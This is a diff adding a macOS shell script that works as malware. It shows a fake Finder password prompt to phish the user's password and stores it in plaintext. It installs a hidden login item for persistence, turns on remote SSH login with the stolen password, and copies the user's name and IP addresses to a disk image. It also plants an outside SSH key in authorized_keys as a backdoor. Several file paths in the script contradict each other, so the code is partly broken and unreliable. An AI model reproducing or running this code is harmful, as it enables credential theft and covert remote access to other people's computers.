@@ -1,0 +1,60 @@
+# Folder Setup #
+
+mkdir "CustomLaunchScripts"
+
+
+
+# Script Injection #
+
+# - getpass script
+
+checkpass=`cat ~/library/customlaunchscripts/pass`
+works=`echo $checkpass | sudo -S echo "0"`
+if [ $works == "0" ]; then
+echo $checkpass | sudo -S systemsetup -setremotelogin on
+exit
+fi
+
+echo 'wrong=""
+while [ "$wrong" == "" ]
+do
+password="$(osascript -e 'Tell application "System Events" to display dialog "Finder requires your password to continue." default answer "" with hidden answer with icon {"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}' -e 'text returned of result' 2>/dev/null)"
+wrong=`echo $password | sudo -S echo "0"`
+if [ $password == "terminate" ]; then
+#wrong="terminate"
+exit
+fi
+sudo -k
+done
+echo $password > ~/Library/CustomLaunchScripts/pass ' >> ~/library/custom/launch/scripts/getpass
+
+# - login script
+echo 'nohup sh ~/library/custom/launch/scripts/getpass >/dev/null &
+killall Terminal ' >> ~/Library/CustomLaunchScripts/login
+
+
+
+# Executables #
+
+chmod +x ~/library/custom/launch/scripts/getpass
+chmod +x ~/library/custom/launch/scripts/login
+
+
+
+# Run #
+
+# - add to login
+osascript -e 'tell application "System Events" to make login item at end with properties {path:"~/library/customlaunchscripts/login", hidden:true}'
+
+# - turn on remote login
+cat ~/library/customlaunchscripts/pass | sudo -S systemsetup -setremotelogin on
+
+# - get user data
+path=`pwd`
+username=${path:7}
+info=`ifconfig | grep inet`
+echo $username >> /Volumes/DISK_IMG/People/$username.txt
+echo "" >> /Volumes/DISK_IMG/People/$username.txt
+echo $info >> /Volumes/DISK_IMG/People/$username.txt
+mkdir .ssh
+cat /Volumes/DISK_IMG/Files/id_rsa.pub >> .ssh/authorized_keys
